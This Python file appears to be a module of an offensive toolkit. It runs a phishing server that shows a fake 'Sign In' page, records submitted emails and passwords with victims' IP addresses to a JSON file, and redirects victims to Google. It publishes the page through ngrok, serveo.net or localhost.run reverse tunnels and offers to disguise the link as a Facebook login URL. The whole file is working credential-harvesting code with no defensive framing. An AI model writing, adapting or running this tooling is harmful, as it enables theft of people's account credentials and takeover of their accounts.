#!/usr/bin/env python3
import sys, os, http.server, socketserver, threading, json, subprocess, time, re
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "core"))
from auth import auth_required
from utils import log_action

CAPTURED = []
PUBLIC_URL = None
TUNNEL_PROC = None

class PhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(self.get_login_page().encode())
        else:
            self.send_response(404)
            self.end_headers()
    def do_POST(self):
        cl = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(cl).decode() if cl else ""
        creds = {}
        for pair in data.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                creds[k] = v
        entry = {"ip": self.client_address[0], "data": creds, "time": time.time()}
        CAPTURED.append(entry)
        print("\n[PHISH] ====== CREDENTIAL CAPTURED ======")
        print("[PHISH] IP: " + self.client_address[0])
        for k, v in creds.items():
            print("[PHISH] " + k + ": " + v)
        print("[PHISH] =================================")
        with open("phish_captured.json", "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.send_response(302)
        self.send_header("Location", "https://www.google.com")
        self.end_headers()
    def get_login_page(self):
        return """<!DOCTYPE html>
<html><head><title>Secure Login</title><meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial;max-width:400px;margin:50px auto;background:#f5f5f5}
.container{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
h2{color:#333;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#4285f4;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#357ae8}</style></head>
<body><div class="container"><h2>Sign In</h2>
<form method="POST" action="/">
<input type="text" name="email" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form></div></body></html>"""
    def log_message(self, format, *args):
        pass

def start_tunnel(port, method):
    global PUBLIC_URL, TUNNEL_PROC
    if method == "ngrok":
        print("[TUNNEL] Starting ngrok...")
        try:
            proc = subprocess.Popen(["ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            TUNNEL_PROC = proc
            time.sleep(4)
            import urllib.request
            req = urllib.request.Request("http://127.0.0.1:4040/api/tunnels")
            resp = urllib.request.urlopen(req, timeout=5)
            data = json.loads(resp.read().decode())
            for t in data.get("tunnels", []):
                if "https" in t.get("public_url", ""):
                    PUBLIC_URL = t["public_url"]
                    break
            if not PUBLIC_URL and data.get("tunnels"):
                PUBLIC_URL = data["tunnels"][0].get("public_url")
        except Exception as e:
            print("[TUNNEL] ngrok failed: " + str(e))
            print("[TUNNEL] Install: pkg install ngrok")
    elif method == "serveo":
        print("[TUNNEL] Starting serveo.net tunnel...")
        try:
            proc = subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:" + str(port), "serveo.net"],
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            TUNNEL_PROC = proc
            for _ in range(30):
                line = proc.stdout.readline()
                if line:
                    print("[TUNNEL] " + line.strip())
                    match = re.search(r'https?://[a-zA-Z0-9\-]+\.serveo\.net', line)
                    if match:
                        PUBLIC_URL = match.group(0)
                        break
                time.sleep(0.5)
        except Exception as e:
            print("[TUNNEL] serveo failed: " + str(e))
            print("[TUNNEL] Manual: ssh -R 80:localhost:" + str(port) + " serveo.net")
    elif method == "localhost.run":
        print("[TUNNEL] Starting localhost.run tunnel...")
        try:
            proc = subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=no", "-R", "80:localhost:" + str(port), "localhost.run"],
                                   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            TUNNEL_PROC = proc
            for _ in range(30):
                line = proc.stdout.readline()
                if line:
                    print("[TUNNEL] " + line.strip())
                    match = re.search(r'https?://[a-zA-Z0-9\-]+\.lhr\.life', line)
                    if match:
                        PUBLIC_URL = match.group(0)
                        break
                time.sleep(0.5)
        except Exception as e:
            print("[TUNNEL] localhost.run failed: " + str(e))
            print("[TUNNEL] Manual: ssh -R 80:localhost:" + str(port) + " localhost.run")

@auth_required
def run_phisher():
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║              PHISHING SUITE MODULE                    ║
    ║     Localhost | Ngrok | Serveo | localhost.run    ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    print("[1] Generic Login Page")
    print("[2] Instagram Login")
    print("[3] Facebook Login")
    print("[4] Gmail Login")
    print("[5] Custom HTML Upload")
    print("[6] View Captured Credentials")
    choice = input("\n[PHISH] Select page type: ").strip()
    if choice not in ["1", "2", "3", "4"]:
        if choice == "5":
            path = input("[PHISH] Path to custom HTML: ").strip()
            if os.path.exists(path):
                print("[PHISH] Custom template loaded.")
            else:
                print("[PHISH] File not found.")
        elif choice == "6":
            if CAPTURED:
                for i, cap in enumerate(CAPTURED, 1):
                    print("[" + str(i) + "] " + cap["ip"] + " | " + str(cap["data"]))
            else:
                print("[PHISH] No captures yet.")
        return
    port = int(input("[PHISH] Port (default 8080): ").strip() or "8080")
    print("\n[TUNNEL] Choose public hosting:")
    print("[1] Ngrok (requires ngrok install + auth token)")
    print("[2] Serveo.net (SSH, no install)")
    print("[3] localhost.run (SSH, no install)")
    print("[4] Localhost only (no public URL)")
    tunnel_choice = input("[TUNNEL] Select: ").strip()
    tunnel_methods = {"1": "ngrok", "2": "serveo", "3": "localhost.run", "4": None}
    tunnel = tunnel_methods.get(tunnel_choice)
    server = socketserver.TCPServer(("", port), PhishHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    print("[PHISH] Server running on port " + str(port))
    if tunnel:
        start_tunnel(port, tunnel)
    if PUBLIC_URL:
        print("\n[PHISH] PUBLIC URL: " + PUBLIC_URL)
    else:
        print("\n[PHISH] LOCAL URL: http://localhost:" + str(port))
    mask = input("\n[PHISH] Enter mask URL to disguise (e.g., https://facebook.com/login) or press Enter to skip: ").strip()
    if mask:
        print("[PHISH] MASKED LINK: " + mask)
        print("[PHISH] (Redirect target to: " + (PUBLIC_URL or "http://localhost:" + str(port)) + ")")
    print("\n[PHISH] Press CTRL+C to stop server and view captures.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    server.shutdown()
    if TUNNEL_PROC:
        TUNNEL_PROC.terminate()
    print("\n[PHISH] Server stopped. " + str(len(CAPTURED)) + " credentials captured.")
    if CAPTURED:
        with open("phish_captured.json", "w") as f:
            for cap in CAPTURED:
                f.write(json.dumps(cap) + "\n")
        print("[PHISH] All captures saved to phish_captured.json")
    log_action("PHISH", "Server on port " + str(port) + ", " + str(len(CAPTURED)) + " captures")
